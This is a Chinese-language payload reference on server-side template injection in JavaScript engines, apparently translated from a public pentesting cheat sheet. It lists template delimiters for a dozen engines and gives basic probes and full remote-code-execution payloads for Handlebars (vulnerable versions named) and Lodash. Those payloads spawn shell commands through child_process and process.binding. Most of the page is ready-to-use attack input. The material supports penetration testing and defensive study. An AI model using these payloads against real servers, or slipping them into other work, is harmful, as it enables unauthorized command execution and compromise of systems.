[原文文档](JavaScript.en.md)

# 服务器端模板注入 - JavaScript

> 服务器端模板注入（SSTI）发生在攻击者可以将恶意代码注入服务器端模板中，导致服务器执行任意命令。在JavaScript上下文中，当使用服务器端模板引擎（如Handlebars、EJS或Pug）时，如果用户输入被集成到模板中而没有足够的清理，就会出现SSTI漏洞。

## 概述

- [模板库](#模板库)
- [Handlebars](#handlebars)
    - [Handlebars - 基本注入](#handlebars---基本注入)
    - [Handlebars - 命令执行](#handlebars---命令执行)
- [Lodash](#lodash)
    - [Lodash - 基本注入](#lodash---基本注入)
    - [Lodash - 命令执行](#lodash---命令执行)
- [参考资料](#参考资料)

## 模板库

| 模板名称 | 负载格式 |
| ------------ | --------- |
| DotJS        | `{{= }}`  |
| DustJS       | `{}`      |
| EJS          | `<% %>`   |
| HandlebarsJS | `{{ }}`   |
| HoganJS      | `{{ }}`   |
| Lodash       | `{{= }}`  |
| MustacheJS   | `{{ }}`   |
| NunjucksJS   | `{{ }}`   |
| PugJS        | `#{}`     |
| TwigJS       | `{{ }}`   |
| UnderscoreJS | `<% %>`   |
| VelocityJS   | `#=set($X="")$X` |
| VueJS        | `{{ }}`   |

## Handlebars

[官方网站](https://handlebarsjs.com/)
> Handlebars将模板编译为JavaScript函数。

### Handlebars - 基本注入

```js
{{this}}
{{self}}
```

### Handlebars - 命令执行

此负载仅在handlebars版本中有效，在[GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6)中修复：

- `>= 4.1.0`, `< 4.1.2`
- `>= 4.0.0`, `< 4.0.14`
- `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[官方网站](https://lodash.com/docs/4.17.15)
> 一个提供模块化、性能和额外功能的现代JavaScript工具库。

### Lodash - 基本注入

如何创建模板：

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string：**模板字符串。
- **options.interpolate：**一个正则表达式，指定HTML *interpolate*分隔符。
- **options.evaluate：**一个正则表达式，指定HTML *evaluate*分隔符。
- **options.escape：**一个正则表达式，指定HTML *escape*分隔符。

为了实现RCE，模板的分隔符由**options.evaluate**参数确定。

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - 命令执行

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## 参考资料

- [利用Less.js实现RCE - Jeremy Buis - 2021年7月1日](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
- [Shopify应用程序中的Handlebars模板注入和RCE - Mahmoud Gamal - 2019年4月4日](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)